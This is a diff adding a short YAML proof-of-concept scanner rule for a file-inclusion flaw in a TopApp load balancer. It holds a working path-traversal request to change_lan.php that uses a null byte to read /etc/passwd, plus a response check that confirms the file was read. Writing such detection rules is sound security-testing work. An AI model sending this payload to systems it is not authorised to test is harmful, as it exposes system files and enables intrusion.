@@ -1,0 +1,11 @@
+name: poc-yaml-topapp-lb-fileinclude
+rules:
+  - method: GET
+    path: /change_lan.php?LanID=../../../../../../../../../etc/passwd%00
+    follow_redirects: true
+    expression: |
+      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body) && response.body.bcontains(b"PRODUCT_NAME_STRING")
+detail:
+  author: liberty
+  links:
+    - http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2015-0118464
